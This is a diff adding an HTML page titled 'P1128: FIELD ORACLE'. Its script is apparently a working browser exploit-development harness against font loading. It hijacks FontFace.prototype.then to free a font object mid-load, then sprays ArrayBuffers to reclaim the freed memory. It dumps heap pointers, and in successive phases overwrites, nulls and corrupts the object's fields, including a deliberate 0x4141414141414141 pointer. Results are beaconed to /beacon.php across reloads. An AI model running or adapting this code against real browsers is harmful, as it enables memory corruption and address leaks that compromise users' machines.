@@ -1,0 +1,273 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1128</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+function ptrTag(v){if(typeof v!=='bigint'||v===0n)return'';var h=Number(v>>32n);return h>=0x200&&h<=0x7FFF?'C':h>=0x10&&h<=0xFF?'H':h>=0xFFFF8000?'K':v<0x10000n?'s':'v';}
+function snap(b){var r=[];for(var q=0;q<b.length;q++)if(b[q]!==0n)r.push(q+':'+hex64(b[q])+ptrTag(b[q]));return r.length?r.join(','):'Z';}
+
+var S;try{S=JSON.parse(localStorage.getItem('p1128')||'null');}catch(e){S=null;}
+if(!S)S={b:0,h:0,m:0,phase:0,R:[]};S.b++;
+try{localStorage.setItem('p1128',JSON.stringify(S));}catch(e){}
+
+B('P1128-BOOT','b='+S.b+'|h='+S.h+'|m='+S.m+'|ph='+S.phase);
+log('phase','P1128: FIELD ORACLE (boot '+S.b+', '+S.h+' hits, phase '+S.phase+')');
+
+if(S.b>80){
+  log('ok','DONE');
+  B('P1128-DONE','h='+S.h+'|m='+S.m);
+  for(var i=0;i<S.R.length;i++)B('P1128-R'+i,S.R[i]);
+}else{
+
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8,r=S.b,fired=false,map=null,found=false;
+
+// CSSFontFace object: 192 bytes = 24 qwords
+// Known layout: q0=refcount(1), q1-q10=0, q11=HEAP, q12=0, q13=HEAP, q14-q23=0
+// Phase determines which experiment we run on hit
+
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:r"+r+";src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var ff=new FontFace('f'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);void ff.loaded;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(fired)return undefined;fired=true;
+  if(st.parentNode)st.remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  map=[];
+  for(var si=0;si<SIZES.length;si++){var sz=SIZES[si];for(var k=0;k<K;k++)map.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});}
+  try{document.fonts.check('1em r'+r);}catch(e){}
+  return undefined;
+},set:function(){}});
+
+document.fonts.load('1em f'+r+', r'+r,'AB').then(function(){},function(){});
+
+for(var t=5;t<=250;t+=2){(function(ms){setTimeout(function(){
+  if(found||!map)return;
+  for(var bi=20;bi<56;bi++){
+    if(!map[bi])continue;
+    var b=new BigUint64Array(map[bi].ab);
+    var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+    if(nz>0&&!found){
+      found=true;S.h++;
+      var hb=b;
+      var origSnap=snap(b);
+      var origQ0=b[0],origQ11=b[11],origQ13=b[13];
+      B('P1128-HIT','r'+r+'|bi='+bi+'|ms='+ms+'|ph='+S.phase+'|'+origSnap);
+      log('win','HIT! Phase '+S.phase+': '+origSnap);
+
+      // Keep event loop busy to prevent cleanup
+      var busyKeeper=setInterval(function(){void 0;},1);
+      setTimeout(function(){clearInterval(busyKeeper);},5000);
+
+      // ===== EXPERIMENT PHASES =====
+      setTimeout(function(){
+        var phase=S.phase;
+        S.phase++; // Next hit will test next phase
+        try{localStorage.setItem('p1128',JSON.stringify(S));}catch(e){}
+
+        if(phase===0){
+          // ===== PHASE 0: FULL DUMP — read all 24 qwords with type tags =====
+          var dump=[];
+          for(var q=0;q<24;q++){
+            var v=hb[q];
+            dump.push('q'+q+'='+hex64(v)+'('+ptrTag(v)+')');
+          }
+          B('P1128-DUMP',dump.join('|'));
+          log('info','Full dump: '+dump.join(' '));
+          S.R.push('DUMP|'+dump.join(','));
+
+          // Also test: what does the FontFace JS API return?
+          var apiData=[];
+          try{apiData.push('family='+ff.family);}catch(e){apiData.push('family=ERR');}
+          try{apiData.push('style='+ff.style);}catch(e){apiData.push('style=ERR');}
+          try{apiData.push('weight='+ff.weight);}catch(e){apiData.push('weight=ERR');}
+          try{apiData.push('status='+ff.status);}catch(e){apiData.push('status=ERR');}
+          try{apiData.push('unicode='+ff.unicodeRange);}catch(e){apiData.push('unicode=ERR');}
+          B('P1128-API',apiData.join('|'));
+          log('info','API: '+apiData.join(' '));
+          S.R.push('API|'+apiData.join(','));
+
+        }else if(phase===1){
+          // ===== PHASE 1: SWAP q11 and q13 =====
+          // Point q11 to q13's target and vice versa
+          hb[11]=origQ13;
+          hb[13]=origQ11;
+          B('P1128-SWAP','q11='+hex64(origQ13)+'|q13='+hex64(origQ11));
+
+          // Trigger font operations
+          var opResults=[];
+          try{var chk=document.fonts.check('1em f'+r);opResults.push('check='+chk);}catch(e){opResults.push('check=ERR|'+e.message);}
+          try{
+            var iter=document.fonts.values();
+            var cnt=0;
+            var n=iter.next();
+            while(!n.done&&cnt<10){cnt++;n=iter.next();}
+            opResults.push('iter='+cnt);
+          }catch(e){opResults.push('iter=ERR');}
+          // Force layout
+          var d=document.createElement('div');
+          d.style.fontFamily="'f"+r+"', Arial";
+          d.textContent='Test';
+          document.body.appendChild(d);
+          document.body.offsetHeight;
+          opResults.push('layout=OK');
+          try{document.body.removeChild(d);}catch(e){}
+
+          // Read back — did the engine overwrite anything?
+          var postSwap=snap(hb);
+          B('P1128-SWAP-RESULT','ops='+opResults.join(',')+' | post='+postSwap);
+          S.R.push('SWAP|'+opResults.join(',')+' | '+postSwap);
+
+          // RESTORE
+          hb[11]=origQ11;hb[13]=origQ13;
+
+        }else if(phase===2){
+          // ===== PHASE 2: NULL q11 — see if engine crashes or handles gracefully =====
+          hb[11]=0n;
+          B('P1128-NULL11','set_q11_to_0');
+
+          var opResults=[];
+          try{var chk=document.fonts.check('1em f'+r);opResults.push('check='+chk);}catch(e){opResults.push('check=ERR|'+e.message);}
+          try{
+            for(var it=document.fonts.values(),n=it.next(),cnt=0;!n.done&&cnt<5;n=it.next(),cnt++);
+            opResults.push('iter='+cnt);
+          }catch(e){opResults.push('iter=ERR');}
+
+          var postNull=snap(hb);
+          B('P1128-NULL11-RESULT','ops='+opResults.join(',')+'|post='+postNull);
+          S.R.push('NULL11|'+opResults.join(',')+' | '+postNull);
+
+          hb[11]=origQ11; // RESTORE
+
+        }else if(phase===3){
+          // ===== PHASE 3: NULL q13 =====
+          hb[13]=0n;
+          B('P1128-NULL13','set_q13_to_0');
+
+          var opResults=[];
+          try{var chk=document.fonts.check('1em f'+r);opResults.push('check='+chk);}catch(e){opResults.push('check=ERR');}
+          try{
+            var d=document.createElement('div');
+            d.style.fontFamily="'f"+r+"', Arial";
+            d.textContent='Test null13';
+            document.body.appendChild(d);
+            document.body.offsetHeight;
+            opResults.push('layout=OK');
+            document.body.removeChild(d);
+          }catch(e){opResults.push('layout=ERR');}
+
+          var postNull=snap(hb);
+          B('P1128-NULL13-RESULT','ops='+opResults.join(',')+'|post='+postNull);
+          S.R.push('NULL13|'+opResults.join(',')+' | '+postNull);
+
+          hb[13]=origQ13; // RESTORE
+
+        }else if(phase===4){
+          // ===== PHASE 4: Write sentinels to ALL zero qwords =====
+          // q0=refcount(keep!), q11/q13=ptrs(keep!). Write to all others.
+          var sentinels={};
+          for(var q=1;q<=23;q++){
+            if(q===11||q===13)continue; // Skip live pointers
+            if(hb[q]===0n){
+              hb[q]=BigInt('0xDEAD'+q.toString(16).padStart(4,'0')+'CAFE0000');
+              sentinels[q]=true;
+            }
+          }
+          B('P1128-SENTINELS','wrote='+Object.keys(sentinels).join(','));
+
+          // Now trigger ALL font operations
+          var opResults=[];
+          try{var chk=document.fonts.check('1em f'+r);opResults.push('check='+chk);}catch(e){opResults.push('check=ERR');}
+          try{document.fonts.forEach(function(f){});opResults.push('forEach=OK');}catch(e){opResults.push('forEach=ERR');}
+          try{
+            var d=document.createElement('div');
+            d.style.fontFamily="'f"+r+"', serif";
+            d.textContent='Sentinel test ABCDEFGHIJKLMNOP';
+            document.body.appendChild(d);
+            document.body.offsetHeight;
+            opResults.push('layout=OK');
+            document.body.removeChild(d);
+          }catch(e){opResults.push('layout=ERR');}
+
+          // Check which sentinels were overwritten
+          var changed=[];
+          for(var q in sentinels){
+            q=parseInt(q);
+            var expected=BigInt('0xDEAD'+q.toString(16).padStart(4,'0')+'CAFE0000');
+            if(hb[q]!==expected){
+              changed.push('q'+q+':'+hex64(hb[q]));
+            }
+          }
+          B('P1128-SENTINEL-RESULT','ops='+opResults.join(',')+'|changed='+changed.join(','));
+          S.R.push('SENTINEL|changed='+changed.join(',')+' | ops='+opResults.join(','));
+
+          // Restore all sentinels to 0
+          for(var q in sentinels)hb[parseInt(q)]=0n;
+
+        }else if(phase===5){
+          // ===== PHASE 5: Pointer redirect — make q11 point to q11+8 (inside CSSFontFace) =====
+          // This makes the engine read bytes at q11+8 as the sub-object
+          // If q11 pointed to addr X, now it points to X-88+88=X (no change)
+          // Let's try pointing it at q13's value (a different heap object)
+          // Already done in phase 1. Let's try pointing it at a KNOWN BAD address.
+
+          // Write q11 = 0x4141414141414141 (recognizable crash address)
+          // DANGEROUS — this will crash if the engine dereferences q11!
+          hb[11]=BigInt('0x4141414141414141');
+          B('P1128-BADPTR','q11=0x4141414141414141');
+
+          // DON'T trigger any font operations — just see if the page survives
+          setTimeout(function(){
+            // If we get here, the engine didn't dereference q11 yet
+            B('P1128-SURVIVE','page_alive_after_badptr');
+
+            // Now trigger font check — this SHOULD crash if q11 is used
+            try{
+              var chk=document.fonts.check('1em f'+r);
+              B('P1128-NOCRASH','check='+chk+'|q11_NOT_DEREF');
+              S.R.push('BADPTR|SURVIVE|check='+chk);
+            }catch(e){
+              B('P1128-EXCEPT','check_threw='+e.message);
+              S.R.push('BADPTR|EXCEPT|'+e.message);
+            }
+
+            hb[11]=origQ11; // RESTORE
+            try{localStorage.setItem('p1128',JSON.stringify(S));}catch(e){}
+          },50);
+
+        }else if(phase>=6){
+          // ===== PHASE 6+: Repeat full dump for statistical analysis =====
+          var dump=[];
+          for(var q=0;q<24;q++)dump.push('q'+q+'='+hex64(hb[q]));
+          B('P1128-DUMP'+phase,dump.join('|'));
+          S.R.push('DUMP'+phase+'|'+dump.join(','));
+          // Cycle back to interesting phases
+          if(phase>=10)S.phase=0;
+        }
+
+        try{localStorage.setItem('p1128',JSON.stringify(S));}catch(e){}
+      },10);
+
+      try{localStorage.setItem('p1128',JSON.stringify(S));}catch(e){}
+    }
+  }
+},ms);})(t);}
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  if(!found){
+    S.m++;
+    B('P1128-M','r'+r);
+    try{localStorage.setItem('p1128',JSON.stringify(S));}catch(e){}
+  }
+},350);
+
+}
+</script></body></html>
